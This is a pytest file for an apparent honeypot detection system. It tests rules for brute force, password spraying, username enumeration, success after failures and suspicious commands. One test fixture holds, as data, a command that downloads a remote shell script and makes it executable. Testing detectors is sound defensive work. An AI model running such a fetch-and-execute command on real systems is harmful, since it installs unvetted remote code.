import itertools
from datetime import datetime, timedelta, timezone

from database.db import init_db, insert_events
from detection.detection_rules import run_rules
from detection.detector import run_detection

BASE = datetime(2026, 11, 5, tzinfo=timezone.utc)
_ids = itertools.count()


def ts(sec):
    return (BASE + timedelta(seconds=sec)).strftime("%Y-%m-%dT%H:%M:%SZ")


def ev(sec, etype="login_failed", user="root", pw="pw1", session="s1", cmd=None):
    return {
        "event_id": f"e{next(_ids)}", "event_type": etype, "timestamp": ts(sec),
        "source_ip": "10.0.0.9", "session_id": session, "username": user,
        "password_masked": "p***", "password_hash": pw, "command": cmd, "duration_s": None,
    }


def types(events):
    return {a["alert_type"] for a in run_rules("10.0.0.9", events)}


def test_brute_force_triggers_at_threshold():
    assert "brute_force" in types([ev(i) for i in range(5)])
    assert "brute_force" not in types([ev(i) for i in range(4)])


def test_slow_attempts_do_not_trigger():
    assert "brute_force" not in types([ev(i * 20) for i in range(5)])   # 5 in 80s


def test_rapid_attack():
    t = types([ev(i * 2) for i in range(10)])                           # 10 in 18s
    assert {"rapid_attack", "brute_force"} <= t


def test_username_enumeration():
    events = [ev(i, user=f"user{i}", pw=f"h{i}") for i in range(5)]
    assert "username_enumeration" in types(events)


def test_password_spraying():
    events = [ev(i, user=u) for i, u in enumerate(["a", "b", "c"])]
    assert "password_spraying" in types(events)


def test_repeated_attacks():
    events = [ev(h * 3600 + i) for h in range(3) for i in range(3)]    # 3 failures x 3 hours
    t = types(events)
    assert "repeated_attacks" in t and "brute_force" not in t


def test_success_after_failures_is_critical():
    events = [ev(i) for i in range(5)] + [ev(10, "login_success")]
    alerts = run_rules("10.0.0.9", events)
    crit = [a for a in alerts if a["alert_type"] == "success_after_failures"]
    assert crit and crit[0]["severity"] == "critical"


def test_suspicious_command():
    alerts = run_rules("10.0.0.9", [ev(1, "command", cmd="wget http://x/y.sh; chmod +x y.sh")])
    assert alerts[0]["alert_type"] == "suspicious_commands"
    assert alerts[0]["severity"] == "high"


def test_detector_is_idempotent(tmp_path):
    db = tmp_path / "t.db"
    init_db(db)
    insert_events([ev(i) for i in range(6)], db)
    first, second = run_detection(db), run_detection(db)
    assert first["new_alerts"] >= 1
    assert second["new_alerts"] == 0